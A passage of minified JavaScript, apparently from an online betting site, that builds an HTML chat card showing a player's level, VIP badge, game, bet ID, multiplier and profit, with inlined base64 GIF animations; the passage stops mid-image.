        Number(e.userLvl) > 5 && (u = "lvlC2"), Number(e.userLvl) > 10 && (u = "lvlC3"), Number(e.userLvl) > 15 && (u = "lvlC4"), e.game = e.game.charAt(0).toUpperCase() + e.game.slice(1);
        let p = Number(e.userLvlProgress) > 100 ? 100 : Number(e.userLvlProgress),
            m = "" != e.isVip ? '<img src="/assets/image/vipclub/vip2.svg" class="vip_cls" width="17px" height="17px" alt="VIP">' : "",
            f = document.getElementById("chat_game11"),
            h = document.createElement("div"),
            g = `\n    <div class="head">\n      <img  class="avatar ${l}" width="40"\n      ${window.avSrcT(e.avatarId,e.avatarUrl,2)}>\n          <div class="progress_lvl_user ${u}">${e.userLvl}</div>\n          <div class="pr_proc1">\n          <div style="width:${p}%" class="pr_lproc1 ${u}"></div>\n          </div>\n      </div>\n    <div class="content">\n      <div class="title">\n        <div class="name">${m}\n        <span onclick="chatTagName(this)">${e.userName}</span>\n        ${d}\n          <div class="time">${t}</div>\n        </div>\n      </div>\n      <div class="msg-wrap">\n        <div class=" cGmBet44">\n          <div class="   cGmsgT  cGmT44 full-message">\n          ${c}\n            <div class="wrap">\n              <div class=" cSBetWr4 cGmM55">\n                <div class="mid-area">\n                  <div class=" cSBbl44 eHrbYw msg">\n                    <div class="titles">\n                      <div class=" cGimage12 ${a}   animation-win">\n                      </div>\n                      <div class="word">\n                        <p class="one">${r}</p>\n                        <p class="two">${chatLanguage[lngG1]["Bet details"]} | ${e.game}</p>\n                      </div>\n                    </div>\n                    <div class="bet-area open">               \n                      <img width="18" class="cGsvg73 icon" src="/assets/svgGame/${e.game}.svg?x=7" alt="${e.game}"/>\n                      <p>ID ${chatLanguage[lngG1].bet}: #${e.betInfo.id}</p>\n                    </div>\n                    <div class="info-area">\n                      <div class="left">\n                        <p>${chatLanguage[lngG1].Multiplier}</p>\n                        <div class="  animation-card-wrap left">\n                          <div class="animation-card ${a}">\n                            <div class="win-ribbon"><img loading="lazy" alt="img"\n                                src="data:image/gif;base64,R0lGODlhNgFoAPIAANUJ4eFnCeHbCXXRHAme4RzRjQAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpjN2VkYjk0MS03NTZmLTRhNWQtYTVkMi1mMTg1NzRlMzE5NTciIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QUU4NUM5MzJFOTBCMTFFQTlFRTVBN0UxODg3MkMyMjYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QUU4NUM5MzFFOTBCMTFFQTlFRTVBN0UxODg3MkMyMjYiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpkMzVhNjk3My00ZDEyLTQxMGYtYTllNy1mNjQ0YzlmNmU3N2MiIHN0UmVmOmRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo5MGYyMTRjYS02MDdkLWMxNDAtOGYzZi00MDhiYmUzNWMxN2EiLz4gPC9yZGY6RGVzY3Jp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"\n                                class="">${o}</div>\n                          </div>\n                        </div>\n                      </div>\n                      <div class="right">\n                        <div class="top"><img loading="lazy" class="coin-icon" src="${hrefReqGameAll.split("/apps/")[0]}/apps/currency/${e.betInfo.currency}.svg">\n                          <p>${chatLanguage[lngG1].Profit}</p>\n                        </div>\n                        <div class="  animation-card-wrap right-win">\n                          <div class="animation-card ${a}">\n                            <div class="win-ribbon"><img loading="lazy" alt="img"\n                                src="data:image/gif;base64,R0lGODlhNgFoAPIAANUJ4eFnCeHbCXXRHAme4RzRjQAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpjN2VkYjk0MS03NTZmLTRhNWQtYTVkMi1mMTg1NzRlMzE5NTciIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QUU4NUM5MzJFOTBCMTFFQTlFRTVBN0UxODg3MkMyMjYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QUU4NUM5MzFFOTBCMTFFQTlFRTVBN0UxODg3MkMyMjYiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpkMzVhNjk3My00ZDEyLTQxMGYtYTllNy1mNjQ0YzlmNmU3N2MiIHN0UmVmOmRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo5MGYyMTRjYS02MDdkLWMxNDAtOGYzZi00MDhiYmUzNWMxN2EiLz4gPC9yZGY6RGVzY3Jp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